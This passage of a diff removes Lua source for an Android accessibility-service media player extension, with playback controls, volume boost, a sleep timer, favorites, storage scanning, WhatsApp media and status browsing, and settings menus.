@@ -1,2637 +1,563 @@
--- Smart player created by a brothers
--- UI Language: English
-
-require "import"
-import "android.app.AlertDialog"
-import "android.content.DialogInterface"
-import "android.media.MediaPlayer"
-import "java.io.File"
-import "java.io.FileInputStream"
-import "java.io.FileOutputStream"
-import "android.net.Uri"
-import "android.content.Intent"
-import "android.view.WindowManager"
-import "android.os.Handler"
-import "android.os.Looper"
-import "java.lang.Runnable"
-import "android.view.View"
-import "android.widget.LinearLayout"
-import "android.widget.TextView"
-import "android.widget.SeekBar"
-import "android.widget.Button"
-import "android.widget.EditText"
-import "android.text.InputType"
-import "android.view.Gravity"
-import "android.os.StrictMode"
-import "android.app.NotificationManager"
-import "android.app.NotificationChannel"
-import "android.app.Notification"
-import "android.app.PendingIntent"
-import "android.content.Context"
-import "android.content.IntentFilter"
-import "android.media.audiofx.LoudnessEnhancer"
-import "android.provider.MediaStore"
-import "android.widget.ScrollView"
-import "android.os.Environment"
-import "android.view.SurfaceView"
-import "android.view.SurfaceHolder"
-import "android.widget.ListView"
-import "android.widget.ArrayAdapter"
-import "android.widget.AdapterView"
-import "java.lang.Thread"
-
--- Helper to create byte array (works in all LuaJava environments)
-local function newByteArray(size)
-    return luajava.newArray(luajava.bindClass("java.lang.Byte").TYPE, size)
-end
-
--- Helper to set StrictMode policy (avoids nested class syntax error)
-local function setStrictModeAllowFileUri()
-    pcall(function()
-        local builder = luajava.newInstance("android.os.StrictMode$VmPolicy$Builder")
-        local policy = builder.build()
-        StrictMode.setVmPolicy(policy)
-    end)
-end
-
--- Truly Persistent Global Player Instance & States
-if not _G.smart_media_player then
-    _G.smart_media_player = MediaPlayer()
-    _G.smart_player_current_path = ""
-    _G.smart_player_is_prepared = false
-end
-local player = _G.smart_media_player
-
--- Persistent custom FF/RW dynamic configurations storage
-if not _G.ffRwOptions then
-    _G.ffRwOptions = {5000, 10000, 20000, 30000, 60000}
-end
-
-local currentPlaylist = {}
-local currentIndex = 1
-local currentFilePath = ""
-local currentSavedFolder = "/storage/emulated/0"
-local currentSavedMediaType = "audio"
-local lastPlayedPosition = 0
-local ffRwDuration = 10000
-local backgroundPlay = "on"
-local autoPlay = "on"
-local currentBoostStage = 1
-local loudnessEnhancer = nil
-local currentPlaybackSpeed = 1.0
--- WhatsApp Media Center settings variables
-local showWhatsAppMediaToggle = "on"
-local showVolumeBoostToggle = "on"
-local showSleepTimerToggle = "on"
-local showStatusImages = "on"
-local showStatusVideos = "on"
-local multiSelectSetting = "on"
-
--- Search, Sort & Browse Engine States
-local currentSortMethod = "A-Z"
-local currentSearchQuery = ""
-local currentBrowseMode = "folders" 
-
--- Multi-Select Engine Global Variables
-local isMultiSelectActive = false
-local selectedItemsMap = {}
-
--- Sleep Timer Engine Variables
-local sleepHandler = Handler(Looper.getMainLooper())
-local sleepRunnable = nil
-local sleepModeActive = "off"
-local sleepDurationMs = 0
-
--- Configuration File Paths
-local configPath = "/sdcard/smart_player_config.txt"
-local favoritesPath = "/sdcard/smart_player_favorites.txt"
-local NOTIF_ID = 9923
-local CHANNEL_ID = "smart_player_channel"
-local mediaReceiver = nil
-
--- Favorites Engine Storage
-local favoritesMap = {}
-
--- UI References
-local controlsDialog = nil
-local txtTitleRef = nil
-local txtTimeRef = nil
-local seekBarRef = nil
-local btnVolumeBoostRef = nil
-local btnSleepToggleRef = nil
-local btnPlayPauseRef = nil
-local btnFavoriteRef = nil
-local currentSurfaceHolder = nil
-
-local function showToast(text)
-    service.speak(text)
-end
-
--- Favorites Management Functions
-local function loadFavorites()
-    favoritesMap = {}
-    pcall(function()
-        local f = io.open(favoritesPath, "r")
-        if f then
-            for line in f:lines() do
-                if line ~= "" then
-                    favoritesMap[line] = true
-                end
-            end
-            f:close()
-        end
-    end)
-end
-
-local function saveFavorites()
-    pcall(function()
-        local f = io.open(favoritesPath, "w")
-        if f then
-            for path, _ in pairs(favoritesMap) do
-                f:write(path .. "\n")
-            end
-            f:close()
-        end
-    end)
-end
-
-local function isFavorite(path)
-    return favoritesMap[path] == true
-end
-
-local function toggleFavorite(path)
-    if isFavorite(path) then
-        favoritesMap[path] = nil
-        showToast("Removed from Favorites")
-    else
-        favoritesMap[path] = true
-        showToast("Added to Favorites")
-    end
-    saveFavorites()
-end
-
--- Native Playback Speed Applier
-local function applyPlaybackSpeed()
-    if not player then return end
-    pcall(function()
-        local params = player.getPlaybackParams()
-        params.setSpeed(currentPlaybackSpeed)
-        player.setPlaybackParams(params)
-    end)
-end
-
--- Native Volume Boost Applier
-local function applyVolumeBoost(silent)
-    if not player then return end
-    pcall(function()
-        if not loudnessEnhancer then
-            loudnessEnhancer = LoudnessEnhancer(player.getAudioSessionId())
-        end
-        loudnessEnhancer.setEnabled(true)
-        if currentBoostStage == 1 then
-            loudnessEnhancer.setTargetGain(0)
-            if btnVolumeBoostRef then btnVolumeBoostRef.setText("Volume Boost: Normal") end
-            if not silent then showToast("Volume Boost: Normal") end
-        elseif currentBoostStage == 2 then
-            loudnessEnhancer.setTargetGain(1200)
-            if btnVolumeBoostRef then btnVolumeBoostRef.setText("Volume Boost: 1.5x") end
-            if not silent then showToast("Volume Boost: 1.5x") end
-        elseif currentBoostStage == 3 then
-            loudnessEnhancer.setTargetGain(2500)
-            if btnVolumeBoostRef then btnVolumeBoostRef.setText("Volume Boost: 2.0x") end
-            if not silent then showToast("Volume Boost: 2.0x") end
-        elseif currentBoostStage == 4 then
-            loudnessEnhancer.setTargetGain(4000)
-            if btnVolumeBoostRef then btnVolumeBoostRef.setText("Volume Boost: 3.0x") end
-            if not silent then showToast("Volume Boost: 3.0x") end
-        end
-    end)
-end
-
--- Notification Controller Engine
-local function showNotification(title)
-    pcall(function()
-        local ns = Context.NOTIFICATION_SERVICE
-        local nm = service.getSystemService(ns)
-        if android.os.Build.VERSION.SDK_INT >= 26 then
-            local channel = NotificationChannel(CHANNEL_ID, "Smart Player Playback", NotificationManager.IMPORTANCE_LOW)
-            nm.createNotificationChannel(channel)
-        end
-        local builder
-        if android.os.Build.VERSION.SDK_INT >= 26 then
-            builder = Notification.Builder(service, CHANNEL_ID)
-        else
-            builder = Notification.Builder(service)
-        end
-        if not mediaReceiver then
-            mediaReceiver = luajava.createProxy("android.content.BroadcastReceiver", {
-                onReceive = function(context, intent)
-                    if intent.getAction() == "com.smartplayer.TOGGLE" then
-                        if player.isPlaying() then
-                            player.pause()
-                            if btnPlayPauseRef then btnPlayPauseRef.setText("Play") end
-                        else
-                            player.start()
-                            applyPlaybackSpeed()
-                            if btnPlayPauseRef then btnPlayPauseRef.setText("Pause") end
-                        end
-                        showNotification(File(currentFilePath).getName())
-                    end
-                end
-            })
-            local filter = IntentFilter("com.smartplayer.TOGGLE")
-            service.registerReceiver(mediaReceiver, filter)
-        end
-        local toggleIntent = Intent("com.smartplayer.TOGGLE")
-        local flags = 134217728
-        if android.os.Build.VERSION.SDK_INT >= 23 then
-            flags = flags + 67108864
-        end
-        local pToggle = PendingIntent.getBroadcast(service, 0, toggleIntent, flags)
-        local appInfo = service.getApplicationInfo()
-        builder.setContentTitle("Smart player created by a brothers")
-        builder.setContentText(title)
-        builder.setSmallIcon(appInfo.icon)
-        builder.setOngoing(player.isPlaying())
-        local actionText = player.isPlaying() and "Pause" or "Play"
-        if android.os.Build.VERSION.SDK_INT >= 20 then
-            local action = Notification.Action.Builder(appInfo.icon, actionText, pToggle).build()
-            builder.addAction(action)
-        else
-            builder.addAction(appInfo.icon, actionText, pToggle)
-        end
-        nm.notify(NOTIF_ID, builder.build())
-    end)
-end
-
-local function cancelNotification()
-    pcall(function()
-        local ns = Context.NOTIFICATION_SERVICE
-        local nm = service.getSystemService(ns)
-        nm.cancel(NOTIF_ID)
-    end)
-end
-
--- Recursive Folder Deletion Engine
-local function deleteFolderRecursive(fileOrDirectory)
-    if fileOrDirectory.isDirectory() then
-        local children = fileOrDirectory.listFiles()
-        if children then
-            for i = 0, #children - 1 do
-                deleteFolderRecursive(children[i])
-            end
-        end
-    end
-    return fileOrDirectory.delete()
-end
-
--- Recursive Folder Size Calculation Engine
-local function getFolderSizeRecursive(fileOrDirectory)
-    local totalSize = 0
-    if fileOrDirectory.isDirectory() then
-        local children = fileOrDirectory.listFiles()
-        if children then
-            for i = 0, #children - 1 do
-                totalSize = totalSize + getFolderSizeRecursive(children[i])
-            end
-        end
-    else
-        pcall(function() totalSize = fileOrDirectory.length() end)
-    end
-    return totalSize
-end
-
--- Helper to Format Bytes to MB/GB
-local function formatSize(totalBytes)
-    local sizeInMb = totalBytes / (1024 * 1024)
-    if sizeInMb >= 1024 then
-        local sizeInGb = sizeInMb / 1024
-        return string.format("%.2f GB", sizeInGb)
-    else
-        return string.format("%.2f MB", sizeInMb)
-    end
-end
-
--- Multi-Select Statistics Tracker
-local function getSelectedStats(filteredList, selectedMap)
-    local count = 0
-    local totalSize = 0
-    for _, item in ipairs(filteredList) do
-        if selectedMap[item.path] then
-            count = count + 1
-            local f = File(item.path)
-            if item.isDir then
-                pcall(function() totalSize = totalSize + getFolderSizeRecursive(f) end)
-            else
-                pcall(function() totalSize = totalSize + f.length() end)
-            end
-        end
-    end
-    return count, formatSize(totalSize)
-end
-
--- Persistent Storage: Save State
-local function saveState()
-    pcall(function()
-        _G.smart_player_playlist = currentPlaylist
-        _G.smart_player_index = currentIndex
-        local f = io.open(configPath, "w")
-        if f then
-            f:write((currentSavedFolder or "/storage/emulated/0") .. "\n")
-            f:write((currentSavedMediaType or "audio") .. "\n")
-            f:write((currentFilePath or "") .. "\n")
-            local pos = 0
-            if player and currentFilePath ~= "" and _G.smart_player_is_prepared then 
-                pcall(function() pos = player.getCurrentPosition() end) 
-            end
-            if pos <= 0 and lastPlayedPosition > 0 then pos = lastPlayedPosition end
-            f:write(tostring(pos) .. "\n")
-            f:write(tostring(ffRwDuration) .. "\n")
-            f:write((backgroundPlay or "on") .. "\n")
-            f:write((autoPlay or "on") .. "\n")
-            f:write(tostring(sleepDurationMs or 0) .. "\n")
-            f:write(tostring(currentPlaybackSpeed or 1.0) .. "\n")
-            f:write((showWhatsAppMediaToggle or "on") .. "\n")
-            f:write((currentSortMethod or "A-Z") .. "\n")
-            f:write((currentBrowseMode or "folders") .. "\n")
-            f:write((showVolumeBoostToggle or "on") .. "\n")
-            f:write((showSleepTimerToggle or "on") .. "\n")
-            f:write((showStatusImages or "on") .. "\n")
-            f:write((showStatusVideos or "on") .. "\n")
-            f:write((multiSelectSetting or "on") .. "\n")
-            f:close()
-        end
-    end)
-end
-
--- Persistent Storage: Load State
-local function loadState()
-    pcall(function()
-        if _G.smart_player_playlist then
-            currentPlaylist = _G.smart_player_playlist
-        end
-        if _G.smart_player_index then
-            currentIndex = _G.smart_player_index
-        end
-        local f = io.open(configPath, "r")
-        if f then
-            currentSavedFolder = f:read("*l") or "/storage/emulated/0"
-            currentSavedMediaType = f:read("*l") or "audio"
-            currentFilePath = f:read("*l") or ""
-            lastPlayedPosition = tonumber(f:read("*l")) or 0
-            ffRwDuration = tonumber(f:read("*l")) or 10000
-            backgroundPlay = f:read("*l") or "on"
-            autoPlay = f:read("*l") or "on"
-            sleepDurationMs = tonumber(f:read("*l")) or 0
-            currentPlaybackSpeed = tonumber(f:read("*l")) or 1.0
-            showWhatsAppMediaToggle = f:read("*l") or "on"
-            currentSortMethod = f:read("*l") or "A-Z"
-            currentBrowseMode = f:read("*l") or "folders"
-            showVolumeBoostToggle = f:read("*l") or "on"
-            showSleepTimerToggle = f:read("*l") or "on"
-            showStatusImages = f:read("*l") or "on"
-            showStatusVideos = f:read("*l") or "on"
-            multiSelectSetting = f:read("*l") or "on"
-            f:close()
-        end
-    end)
-end
-
--- Safe Dialog UI Launcher
-local function showDialogSafe(builder, onBackHandler)
-    Handler(Looper.getMainLooper()).post(Runnable({
-        run = function()
-            local dialog = builder.create()
-            dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-            if onBackHandler then
-                import "android.view.KeyEvent"
-                dialog.setOnKeyListener(DialogInterface.OnKeyListener({
-                    onKey = function(d, keyCode, event)
-                        if keyCode == KeyEvent.KEYCODE_BACK and event.getAction() == KeyEvent.ACTION_UP then
-                            dialog.dismiss()
-                            onBackHandler()
-                            return true
-                        end
-                        return false
-                    end
-                }))
-            end
-            dialog.show()
-        end
-    }))
-end
-
--- Enhanced Format Filter Logic
-local function matchesFormat(name, mediaType)
-    local lower = name:lower()
-    if mediaType == "audio" then
-        return lower:find("%.mp3$") or lower:find("%.m4a$") or lower:find("%.wav$") or lower:find("%.ogg$") or lower:find("%.amr$") or lower:find("%.opus$")
-    elseif mediaType == "video" then
-        return lower:find("%.mp4$") or lower:find("%.mkv$") or lower:find("%.3gp$")
-    elseif mediaType == "statuses" then
-        local isImg = lower:find("%.jpg$") or lower:find("%.jpeg$") or lower:find("%.png$")
-        local isVid = lower:find("%.mp4$") or lower:find("%.mkv$") or lower:find("%.3gp$")
-        if isImg and showStatusImages == "off" then return false end
-        if isVid and showStatusVideos == "off" then return false end
-        return isImg or isVid
-    end
-    return false
-end
-
--- WhatsApp Status Helpers
-local function openImageExternally(filePath)
-    pcall(function()
-        local context = service
-        local file = File(filePath)
-        setStrictModeAllowFileUri()
-        local uri = Uri.fromFile(file)
-        
-        local intent = Intent(Intent.ACTION_VIEW)
-        intent.setDataAndType(uri, "image/*")
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
-        context.startActivity(intent)
-    end)
-end
-
--- MediaStore helper
-local function getMediaStoreDirsAndFiles(rootPath, mediaType)
-    local dirs = {}
-    local files = {}
-    local resolver = service.getContentResolver()
-    local uri = MediaStore.Files.getContentUri("external")
-    local projection = {MediaStore.Files.FileColumns.DATA}
-    local selection = MediaStore.Files.FileColumns.DATA .. " LIKE ?"
-    local selArgs = {rootPath .. "/%"}
-    local cursor = resolver.query(uri, projection, selection, selArgs, nil)
-    if cursor then
-        while cursor.moveToNext() do
-            local data = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA))
-            if data and data:sub(1, rootPath:len()) == rootPath then
-                local relativePath = data:sub(rootPath:len() + 2)
-                if relativePath and relativePath ~= "" then
-                    local slashPos = relativePath:find("/")
-                    if slashPos then
-                        local dirName = relativePath:sub(1, slashPos - 1)
-                        if dirName ~= "" and not dirName:find("^%.") then
-                            dirs[dirName] = true
-                        end
-                    else
-                        local name = relativePath
-                        if matchesFormat(name, mediaType) then
-                            table.insert(files, {name = name, path = data, isDir = false})
-                        end
-                    end
-                end
-            end
-        end
-        cursor.close()
-    end
-    local dirList = {}
-    for dirName, _ in pairs(dirs) do
-        table.insert(dirList, {name = dirName, path = rootPath .. "/" .. dirName, isDir = true})
-    end
-    table.sort(dirList, function(a,b) return a.name:lower() < b.name:lower() end)
-    table.sort(files, function(a,b) return a.name:lower() < b.name:lower() end)
-    return dirList, files
-end
-
--- Recursive Scanner Engine
-local function getAllRecursiveFiles(rootPath, mediaType)
-    local files = {}
-    local resolver = service.getContentResolver()
-    local uri = MediaStore.Files.getContentUri("external")
-    local projection = {MediaStore.Files.FileColumns.DATA, MediaStore.Files.FileColumns.DATE_MODIFIED}
-    local selection = MediaStore.Files.FileColumns.DATA .. " LIKE ?"
-    local selArgs = {rootPath .. "/%"}
-    local cursor = nil
-    pcall(function() cursor = resolver.query(uri, projection, selection, selArgs, nil) end)
-    if cursor then
-        while cursor.moveToNext() do
-            local data = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA))
-            if data then
-                local fileObj = File(data)
-                local name = fileObj.getName()
-                if (mediaType == "statuses" or not name:find("^%.")) and matchesFormat(name, mediaType) then
-                    local time = 0
-                    pcall(function() time = cursor.getLong(cursor.getColumnIndex(MediaStore.Files.FileColumns.DATE_MODIFIED)) * 1000 end)
-                    table.insert(files, {name = name, path = data, isDir = false, time = time})
-                end
-            end
-        end
-        cursor.close()
-    end
-    if #files == 0 then
-        local function scanDir(dir)
-            local list = nil
-            pcall(function() list = dir.listFiles() end)
-            if not list then return end
-            for i = 0, #list - 1 do
-                local f = list[i]
-                local name = f.getName()
-                if mediaType == "statuses" or not name:find("^%.") then
-                    local isDir = false
-                    pcall(function() isDir = f.isDirectory() end)
-                    if isDir then
-                        scanDir(f)
-                    else
-                        if matchesFormat(name, mediaType) then
-                            local time = 0
-                            pcall(function() time = f.lastModified() end)
-                            table.insert(files, {name = name, path = f.getAbsolutePath(), isDir = false, time = time})
-                        end
-                    end
-                end
-            end
-        end
-        scanDir(File(rootPath))
-    end
-    return files
-end
-
--- Smart Filter
-local function hasMedia(fileObj, mediaType, depth)
-    if depth > 10 then return false end
-    local list = nil
-    pcall(function() list = fileObj.listFiles() end)
-    if not list then return false end
-    for i = 0, #list - 1 do
-        local child = list[i]
-        local name = child.getName()
-        if not name:find("^%.") then
-            local isDir = false
-            pcall(function() isDir = child.isDirectory() end)
-            if isDir then
-                if hasMedia(child, mediaType, depth + 1) then return true end
-            else
-                if matchesFormat(name, mediaType) then return true end
-            end
-        end
-    end
-    return false
-end
-
--- Helper to find SD card path
-local function getSdCardPathViaMediaStore()
-    local resolver = service.getContentResolver()
-    local uri = MediaStore.Files.getContentUri("external")
-    local projection = {MediaStore.Files.FileColumns.DATA}
-    local selection = MediaStore.Files.FileColumns.DATA .. " LIKE ?"
-    local selArgs = {"/storage/%"}
-    local cursor = nil
-    pcall(function()
-        cursor = resolver.query(uri, projection, selection, selArgs, nil)
-    end)
-    if cursor then
-        while cursor.moveToNext() do
-            local data = cursor.getString(cursor.getColumnIndex(MediaStore.Files.FileColumns.DATA))
-            if data and data:sub(1, 9) == "/storage/" then
-                local relativePath = data:sub(10)
-                local slashPos = relativePath:find("/")
-                if slashPos then
-                    local volume = relativePath:sub(1, slashPos - 1)
-                    if volume ~= "emulated" and volume ~= "self" and volume ~= "sdcard0" then
-                        cursor.close()
-                        return "/storage/" .. volume
-                    end
-                end
-            end
-        end
-        cursor.close()
-    end
-    return nil
-end
-
--- Robust SD card path detection
-local function getExternalSdCardPath()
-    local storageDir = File("/storage")
-    local list = storageDir.listFiles()
-    if list then
-        for i = 0, #list - 1 do
-            local f = list[i]
-            local name = f.getName()
-            if not name:find("^%.") and name ~= "emulated" and name ~= "self" and name ~= "sdcard0" and name ~= "0" then
-                local isDir = false
-                pcall(function() isDir = f.isDirectory() end)
-                if isDir then
-                    return f.getAbsolutePath()
-                end
-            end
-        end
-    end
-    local secondary = os.getenv("SECONDARY_STORAGE")
-    if secondary and secondary ~= "" then
-        local dir = File(secondary)
-        if dir.exists() and dir.isDirectory() then
-            return secondary
-        end
-    end
-    local msPath = getSdCardPathViaMediaStore()
-    if msPath then
-        return msPath
-    end
-    local mediaRw = File("/mnt/media_rw")
-    local listRw = mediaRw.listFiles()
-    if listRw then
-        for i = 0, #listRw - 1 do
-            local f = listRw[i]
-            local name = f.getName()
-            if not name:find("^%.") and name ~= "emulated" and name ~= "self" then
-                local isDir = false
-                pcall(function() isDir = f.isDirectory() end)
-                if isDir then
-                    return f.getAbsolutePath()
-                end
-            end
-        end
-    end
-    return "/storage"
-end
-
-local function saveStatusToGallery(filePath)
-    pcall(function()
-        local srcFile = File(filePath)
-        local fileName = srcFile.getName()
-        local mimeType = fileName:lower():find("%.mp4$") and "video/mp4" or "image/jpeg"
-        
-        local resolver = service.getContentResolver()
-        local contentValues = luajava.newInstance("android.content.ContentValues")
-        contentValues.put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
-        contentValues.put(MediaStore.MediaColumns.MIME_TYPE, mimeType)
-        contentValues.put(MediaStore.MediaColumns.RELATIVE_PATH, "Download/Saved Statuses")
-        
-        local collection
-        if mimeType:find("video") then
-            collection = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
-        else
-            collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        end
-        
-        local uri = resolver.insert(collection, contentValues)
-        if uri then
-            local os = resolver.openOutputStream(uri)
-            local ins = FileInputStream(srcFile)
-            local buffer = newByteArray(8192)
-            local len
-            while true do
-                len = ins.read(buffer)
-                if len == -1 then break end
-                os.write(buffer, 0, len)
-            end
-            ins.close()
-            os.close()
-            showToast("Status saved to Download/Saved Statuses")
-        else
-            local destDir = File("/storage/emulated/0/Download/Saved Statuses")
-            if not destDir.exists() then destDir.mkdirs() end
-            local destFile = File(destDir, fileName)
-            local inStream = FileInputStream(srcFile)
-            local outStream = FileOutputStream(destFile)
-            local buffer = newByteArray(4096)
-            local bytesRead = inStream.read(buffer)
-            while bytesRead ~= -1 do
-                outStream.write(buffer, 0, bytesRead)
-                bytesRead = inStream.read(buffer)
-            end
-            inStream.close()
-            outStream.close()
-            local intent = Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE)
-            intent.setData(Uri.fromFile(destFile))
-            service.sendBroadcast(intent)
-            showToast("Status saved to Download/Saved Statuses (legacy)")
-        end
-    end)
-end
-
--- Local helper to build playlist dynamically when restoring or playing
-local function rebuildPlaylistFromFolder(folderPath, mediaType)
-    if not folderPath or folderPath == "" then return end
-    local file = File(folderPath)
-    local list = file.listFiles()
-    local rawItems = {}
-    if list and #list > 0 then
-        for i = 0, #list - 1 do
-            local f = list[i]
-            local name = f.getName()
-            if (mediaType == "statuses" or not name:find("^%.")) and not f.isDirectory() then
-                if matchesFormat(name, mediaType) then
-                    local time = 0
-                    pcall(function() time = f.lastModified() end)
-                    table.insert(rawItems, {name = name, path = f.getAbsolutePath(), isDir = false, time = time})
-                end
-            end
-        end
-    else
-        local dirs, files = getMediaStoreDirsAndFiles(folderPath, mediaType)
-        for _, f in ipairs(files) do
-            local time = 0
-            pcall(function() time = File(f.path).lastModified() end)
-            table.insert(rawItems, {name = f.name, path = f.path, isDir = false, time = time})
-        end
-    end
-
-    if currentSortMethod == "A-Z" then
-        table.sort(rawItems, function(a, b) return a.name:lower() < b.name:lower() end)
-    elseif currentSortMethod == "Z-A" then
-        table.sort(rawItems, function(a, b) return a.name:lower() > b.name:lower() end)
-    elseif currentSortMethod == "Newest" then
-        table.sort(rawItems, function(a, b) return (a.time or 0) > (b.time or 0) end)
-    elseif currentSortMethod == "Oldest" then
-        table.sort(rawItems, function(a, b) return (a.time or 0) < (b.time or 0) end)
-    end
-
-    currentPlaylist = {}
-    for _, item in ipairs(rawItems) do
-        if mediaType == "statuses" then
-            if item.path:lower():find("%.mp4$") then
-                table.insert(currentPlaylist, item.path)
-            end
-        else
-            table.insert(currentPlaylist, item.path)
-        end
-    end
-
-    for i, path in ipairs(currentPlaylist) do
-        if path == currentFilePath then
-            currentIndex = i
-            break
-        end
-    end
-end
-
-local showMainMenu, showStorageMenu, showWhatsAppMenu, showMediaTypeMenu, showBrowseModeMenu, renderMediaList, playMedia, showPlayerControls, showMoreOptions, startSeekBarUpdate, showSettingsMenu, showAudioSettingsMenu, showSleepTimerDialog, showPlaybackSpeedMenu, showStatusSettingsMenu, resumeLastPlayerState
-
--- 1. Main Menu
-showMainMenu = function()
-    local items = {}
-    local actions = {}
-    table.insert(items, "Scan")
-    table.insert(actions, "scan")
-    if showWhatsAppMediaToggle == "on" then
-        table.insert(items, "WhatsApp Media")
-        table.insert(actions, "whatsapp")
-    end
-    table.insert(items, "Settings")
-    table.insert(actions, "settings")
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle("Smart player created by a brothers")
-    builder.setItems(items, function(dialog, which)
-        local action = actions[which + 1]
-        if action == "scan" then
-            showStorageMenu()
-        elseif action == "whatsapp" then
-            showWhatsAppMenu()
-        elseif action == "settings" then
-            showSettingsMenu()
-        end
-    end)
-    builder.setNegativeButton("Close", nil)
-    showDialogSafe(builder)
-end
-
--- WhatsApp Media Shortcut
-showWhatsAppMenu = function()
-    local items = {"WhatsApp Audio", "WhatsApp Voice Notes", "WhatsApp Video", "WhatsApp Statuses"}
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle("WhatsApp Media Center")
-    builder.setItems(items, function(dialog, which)
-        local baseDir = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/"
-        if not File(baseDir .. "WhatsApp Video").exists() then
-            baseDir = "/storage/emulated/0/WhatsApp/Media/"
-        end
-        local selectedPath = ""
-        local mediaType = "audio"
-        if which == 0 then
-            selectedPath = baseDir .. "WhatsApp Audio"
-        elseif which == 1 then
-            selectedPath = baseDir .. "WhatsApp Voice Notes"
-        elseif which == 2 then
-            selectedPath = baseDir .. "WhatsApp Video"
-            mediaType = "video"
-        elseif which == 3 then
-            selectedPath = baseDir .. ".Statuses"
-            mediaType = "statuses"
-        end
-        local checkFile = File(selectedPath)
-        if checkFile.exists() and checkFile.isDirectory() then
-            currentBrowseMode = "folders"
-            currentSearchQuery = ""
-            saveState()
-            renderMediaList(selectedPath, mediaType)
-        else
-            showToast("WhatsApp directory not found or empty.")
-            showMainMenu()
-        end
-    end)
-    builder.setNegativeButton("Back", function() showMainMenu() end)
-    showDialogSafe(builder, function() showMainMenu() end)
-end
-
--- 2. Master Settings Menu
-showSettingsMenu = function()
-    local displayItems = luajava.newInstance("java.util.ArrayList")
-    local lv = ListView(service)
-    local adapter = ArrayAdapter(service, android.R.layout.simple_list_item_1, displayItems)
-    lv.setAdapter(adapter)
-
-    local function updateItems()
-        displayItems.clear()
-        displayItems.add("Audio Settings")
-        displayItems.add("Status Settings")
-        displayItems.add("Show WhatsApp Media in Main Menu: " .. showWhatsAppMediaToggle:upper())
-        displayItems.add("Multi-Select Mode: " .. multiSelectSetting:upper())
-        displayItems.add("About Extension")
-        adapter.notifyDataSetChanged()
-    end
-    updateItems()
-
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle("Settings")
-    builder.setView(lv)
-    
-    local dialog = nil
-    lv.setOnItemClickListener(AdapterView.OnItemClickListener({
-        onItemClick = function(parent, view, position, id)
-            if position == 0 then
-                dialog.dismiss()
-                showAudioSettingsMenu()
-            elseif position == 1 then
-                dialog.dismiss()
-                showStatusSettingsMenu()
-            elseif position == 2 then
-                showWhatsAppMediaToggle = (showWhatsAppMediaToggle == "on") and "off" or "on"
-                saveState()
-                showToast("WhatsApp Media Visibility: " .. showWhatsAppMediaToggle:upper())
-                updateItems()
-                pcall(function() lv.setSelection(position) end)
-            elseif position == 3 then
-                multiSelectSetting = (multiSelectSetting == "on") and "off" or "on"
-                saveState()
-                showToast("Multi-Select Mode: " .. multiSelectSetting:upper())
-                updateItems()
-                pcall(function() lv.setSelection(position) end)
-            elseif position == 4 then
-                dialog.dismiss()
-                Handler(Looper.getMainLooper()).post(Runnable({
-                    run = function()
-                        local aboutBuilder = AlertDialog.Builder(service)
-                        aboutBuilder.setTitle("About Extension")
-                        aboutBuilder.setMessage("Smart Player\nCreated by a brothers\n\nOverview:\nA professional high-performance media utility built for advanced persistence control, recursive background scanning, dynamic multi-speed playback modification, and comprehensive automated accessibility assistance.")
-                        aboutBuilder.setNegativeButton("Cancel", function() showSettingsMenu() end)
-                        aboutBuilder.setPositiveButton("Help & Feedback", DialogInterface.OnClickListener({
-                            onClick = function(d, w)
-                                pcall(function()
-                                    d.dismiss()
-                                    local message = "Official Smart Player Support & Feedback:\n\nHello Team,\nI am currently utilizing your Smart Player extension. I am incredibly impressed by its high-performance playback capabilities, robust design, and accessibility integration. Kindly keep me updated regarding future professional releases and technical builds."
-                                    local encodedMsg = Uri.encode(message)
-                                    local url = "https://api.whatsapp.com/send?phone=923477583735&text=" .. encodedMsg
-                                    local intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
-                                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                                    service.startActivity(intent)
-                                end)
-                            end
-                        }))
-                        local abDialog = aboutBuilder.create()
-                        abDialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-                        import "android.view.KeyEvent"
-                        abDialog.setOnKeyListener(DialogInterface.OnKeyListener({
-                            onKey = function(d, keyCode, event)
-                                if keyCode == KeyEvent.KEYCODE_BACK and event.getAction() == KeyEvent.ACTION_UP then
-                                    abDialog.dismiss()
-                                    showSettingsMenu()
-                                    return true
-                                end
-                                return false
-                            end
-                        }))
-                        abDialog.show()
-                    end
-                }))
-            end
-        end
-    }))
-    builder.setNegativeButton("Back", function() dialog.dismiss() showMainMenu() end)
-    
-    Handler(Looper.getMainLooper()).post(Runnable({
-        run = function()
-            dialog = builder.create()
-            dialog.getWindow().setType(WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY)
-            dialog.show()
-        end
-    }))
-end
-
--- Status Settings Sub-Menu
-showStatusSettingsMenu = function()
-    local displayItems = luajava.newInstance("java.util.ArrayList")
-    local lv = ListView(service)
-    local adapter = ArrayAdapter(service, android.R.layout.simple_list_item_1, displayItems)
-    lv.setAdapter(adapter)
-
-    local function updateItems()
-        displayItems.clear()
-        displayItems.add("Show Images in Status Folder: " .. showStatusImages:upper())
-        displayItems.add("Show Videos in Status Folder: " .. showStatusVideos:upper())
-        adapter.notifyDataSetChanged()
-    end
-    updateItems()
-
-    local builder = AlertDialog.Builder(service)
-    builder.setTitle("Status Settings")
-    builder.setView(lv)
-    
-    local dialog = nil
-    lv.setOnItemClickListener(AdapterView.OnItemClickListener({
-        onItemClick = function(parent, view, position, id)
-            if position == 0 then
-                showStatusImages = (showStatusImages == "on") and "off" or "on"
-                showToast("Images in Status: " .. showStatusImages:upper())
-                updateItems()
-                pcall(function() lv.setSelection(position) end)
-            elseif position == 1 then
-                showStatusVideos = (showStatusVideos == "on") and "off" or "on"
-                showToast("Videos in Status: " .. showStatusVideos:upper())
-                updateItems()
-                pcall(function() lv.setSelection(position) end)
-            end
-            saveState()
-        end
-    }))
